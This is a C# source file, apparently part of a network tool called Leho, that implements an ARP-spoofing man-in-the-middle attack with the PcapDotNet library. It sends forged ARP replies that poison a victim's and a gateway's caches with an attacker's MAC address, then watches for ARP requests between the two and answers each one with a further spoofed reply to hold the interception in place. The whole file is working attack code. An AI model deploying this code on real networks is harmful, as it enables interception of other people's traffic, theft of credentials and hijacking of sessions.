using PcapDotNet.Base;
using PcapDotNet.Core;
using PcapDotNet.Packets;
using PcapDotNet.Packets.Arp;
using PcapDotNet.Packets.Ethernet;
using PcapDotNet.Packets.IpV4;
using System.Linq;

namespace Leho.Functions
{
    public class ArpMitm : IFunction
    {
        public ArpMitm(MacAddress gatewayMacAddress, IpV4Address gatewayIpv4Address,
                       MacAddress victimMacAddress, IpV4Address victimIpv4Address,
                       MacAddress attackerMacAddress)
        {
            SpoofGateway = new ArpReply(attackerMacAddress, victimIpv4Address, gatewayMacAddress, gatewayIpv4Address);
            SpoofTarget = new ArpReply(attackerMacAddress, gatewayIpv4Address, victimMacAddress, victimIpv4Address);
            GatewayMacAddress = gatewayMacAddress;
            GatewayIpv4Address = gatewayIpv4Address;
            VictimMacAddress = victimMacAddress;
            VictimIpv4Address = victimIpv4Address;
            AttackerMacAddress = attackerMacAddress;
        }

        public ArpReply SpoofGateway { get; }
        public ArpReply SpoofTarget { get; }
        public MacAddress GatewayMacAddress { get; }
        public IpV4Address GatewayIpv4Address { get; }
        public MacAddress VictimMacAddress { get; }
        public IpV4Address VictimIpv4Address { get; }
        public MacAddress AttackerMacAddress { get; }

        public void Execute(PacketCommunicator packetCommunicator)
        {
            SpoofGateway.Execute(packetCommunicator);
            SpoofTarget.Execute(packetCommunicator);

            packetCommunicator.ReceivePackets(-1, packet =>
            {
                if (packet.Ethernet.EtherType == EthernetType.Arp
                && packet.Ethernet.Arp.IsValid
                && packet.Ethernet.Arp.Operation == ArpOperation.Request)
                {
                    var senderMacAddress = packet.Ethernet.Arp.SenderHardwareAddress.ToArray().ReadMacAddress(0, Endianity.Big);

                    var sentByVictim = senderMacAddress == VictimMacAddress;
                    var sentByGateway = senderMacAddress == GatewayMacAddress;
                    var sentToAttacker = senderMacAddress == AttackerMacAddress;

                    var destinationIsVictim = packet.Ethernet.Arp.TargetProtocolIpV4Address == VictimIpv4Address;
                    var destinationIsGateway = packet.Ethernet.Arp.TargetProtocolIpV4Address == GatewayIpv4Address;

                    var sentByTargetedDevice = sentByVictim || sentByGateway;
                    var destinationIsTargetedDevice = destinationIsVictim || destinationIsGateway;

                    if (sentByTargetedDevice && destinationIsTargetedDevice)
                    {
                        new ArpReply(
                            AttackerMacAddress,
                            packet.Ethernet.Arp.TargetProtocolIpV4Address,
                            packet.Ethernet.Arp.SenderHardwareAddress.ToArray().ReadMacAddress(0, Endianity.Big),
                            packet.Ethernet.Arp.SenderProtocolIpV4Address
                        ).Execute(packetCommunicator);
                    }
                }
            });
        }
    }
}
